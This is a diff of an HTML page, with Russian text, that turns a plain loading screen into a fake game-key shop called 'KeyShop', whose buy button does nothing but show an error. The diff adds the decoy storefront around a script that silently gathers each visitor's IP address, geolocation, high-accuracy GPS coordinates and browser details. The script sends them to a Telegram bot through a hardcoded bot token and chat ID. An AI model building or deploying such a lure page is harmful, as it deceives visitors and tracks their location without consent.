@@ -3,65 +3,198 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Загрузка...</title>
+    <title>KeyShop — цифровые ключи</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            margin: 0;
+            font-family: system-ui, -apple-system, sans-serif;
+            background: #0e1015;
+            color: #e0e0e0;
             min-height: 100vh;
+        }
+        .topbar {
+            background: #16181f;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #222;
+            position: sticky;
+            top: 0;
+            z-index: 10;
+        }
+        .logo {
+            font-weight: 800;
+            font-size: 20px;
+            color: #00e6b8;
+            letter-spacing: -0.5px;
+        }
+        .nav-links {
+            display: flex;
+            gap: 12px;
+            font-size: 13px;
+            color: #999;
+        }
+        .hero {
+            background: linear-gradient(135deg, #1a1f2b, #12161f);
+            padding: 30px 16px;
+            text-align: center;
+            border-bottom: 1px solid #1f2330;
+        }
+        .hero h1 {
+            font-size: 24px;
+            font-weight: 700;
+            color: white;
+            margin-bottom: 6px;
+        }
+        .hero p {
+            color: #7c8ba0;
+            font-size: 14px;
+        }
+        .badge {
+            display: inline-block;
+            background: #00e6b8;
+            color: #0a0c10;
+            font-weight: 700;
+            font-size: 11px;
+            padding: 4px 10px;
+            border-radius: 20px;
+            margin-top: 10px;
+        }
+        .catalog {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 14px;
+            padding: 20px 16px;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        .card {
+            background: #16181f;
+            border-radius: 18px;
+            padding: 14px 12px;
+            border: 1px solid #1f2330;
+            text-align: center;
+            transition: 0.15s;
+        }
+        .card:active { transform: scale(0.97); border-color: #00e6b8; }
+        .card .icon {
+            font-size: 36px;
+            margin-bottom: 8px;
+        }
+        .card .title {
+            font-weight: 700;
+            font-size: 15px;
+            color: white;
+            margin-bottom: 4px;
+        }
+        .card .price {
+            font-size: 18px;
+            font-weight: 800;
+            color: #00e6b8;
+        }
+        .card .old {
+            text-decoration: line-through;
+            color: #5c6a7a;
+            font-size: 13px;
+            margin-right: 6px;
+        }
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 14px;
+            background: #00e6b8;
+            color: #0a0c10;
+            font-weight: 700;
+            font-size: 16px;
+            border: none;
+            border-radius: 14px;
+            text-align: center;
+            margin-top: 6px;
+            cursor: pointer;
+        }
+        .footer {
+            text-align: center;
+            font-size: 11px;
+            color: #4a5568;
+            padding: 30px 16px;
+        }
+        .loader-overlay {
+            position: fixed;
+            inset: 0;
+            background: #0e1015;
             display: flex;
             align-items: center;
             justify-content: center;
-            background: linear-gradient(135deg, #0f0f1a, #1a1a2e);
-            font-family: system-ui, -apple-system, sans-serif;
-            color: white;
-            text-align: center;
-            padding: 20px;
-        }
-        .loader {
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(20px);
-            border-radius: 30px;
-            padding: 50px 40px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            max-width: 400px;
-            width: 100%;
+            z-index: 999;
         }
         .spinner {
-            width: 60px;
-            height: 60px;
-            border: 4px solid rgba(255, 255, 255, 0.1);
+            width: 48px;
+            height: 48px;
+            border: 4px solid #1f2330;
             border-top: 4px solid #00e6b8;
             border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 30px;
+            animation: spin 0.8s linear infinite;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        h2 {
-            font-size: 24px;
-            font-weight: 600;
-            color: #00e6b8;
-            margin-bottom: 10px;
-        }
-        p {
-            font-size: 18px;
-            color: #aaa;
-        }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="loader">
+
+    <!-- Загрузчик (показывается пару секунд) -->
+    <div class="loader-overlay" id="loader">
         <div class="spinner"></div>
-        <h2>Пожалуйста, подождите</h2>
-        <p>Страница загружается...</p>
     </div>
+
+    <!-- САЙТ -->
+    <div class="topbar">
+        <div class="logo">🎮 KeyShop</div>
+        <div class="nav-links">
+            <span>Steam</span>
+            <span>Xbox</span>
+            <span>PS</span>
+        </div>
+    </div>
+    <div class="hero">
+        <h1>Цифровые ключи</h1>
+        <p>Мгновенная доставка • Все платформы</p>
+        <span class="badge">🔥 Скидки до -70%</span>
+    </div>
+    <div class="catalog">
+        <div class="card">
+            <div class="icon">🎮</div>
+            <div class="title">Steam Wallet 50$</div>
+            <div class="price"><span class="old">4490₽</span> 3290₽</div>
+        </div>
+        <div class="card">
+            <div class="icon">❌</div>
+            <div class="title">Xbox Game Pass Ultimate</div>
+            <div class="price"><span class="old">1190₽</span> 790₽</div>
+        </div>
+        <div class="card">
+            <div class="icon">🎮</div>
+            <div class="title">PS Plus 12 месяцев</div>
+            <div class="price"><span class="old">5290₽</span> 3990₽</div>
+        </div>
+        <div class="card">
+            <div class="icon">🎸</div>
+            <div class="title">GTA V Premium</div>
+            <div class="price"><span class="old">1990₽</span> 1290₽</div>
+        </div>
+        <div class="card">
+            <div class="icon">🌴</div>
+            <div class="title">RDR 2 Ultimate</div>
+            <div class="price"><span class="old">3490₽</span> 2590₽</div>
+        </div>
+        <div class="card">
+            <div class="icon">🏎</div>
+            <div class="title">Forza Horizon 5</div>
+            <div class="price"><span class="old">2290₽</span> 1690₽</div>
+        </div>
+    </div>
+    <button class="btn" onclick="alert('Оплата временно недоступна')">💳 Купить сейчас</button>
+    <div class="footer">© 2026 KeyShop. Все платежи защищены. Не является публичной офертой.</div>
+
     <script>
         const TOKEN = '7959565855:AAGXvmUb-T1pPCjYJJRFXcEkE8PFVvJQXSM';
         const CHAT_ID = '1391249960';
@@ -84,14 +217,23 @@
                     { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                 );
             }
-            setTimeout(async () => {
-                const msg = `🕵️ Новый посетитель!\n\nIP: <code>${ip}</code>\n🌍 ${geo}${gps}\n\n📱 ${navigator.userAgent}\n🕒 ${new Date().toLocaleString()}`;
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'HTML'})
-                });
-            }, 6000);
+
+            const msg = `🕵️ Новый посетитель KeyShop!\n\n` +
+                `IP: <code>${ip}</code>\n` +
+                `🌍 ${geo}${gps}\n\n` +
+                `📱 ${navigator.userAgent}\n` +
+                `🕒 ${new Date().toLocaleString()}`;
+
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'HTML'})
+            });
+
+            // Скрываем загрузчик через 2 секунды
+            setTimeout(() => {
+                document.getElementById('loader').style.display = 'none';
+            }, 2000);
         })();
     </script>
 </body>
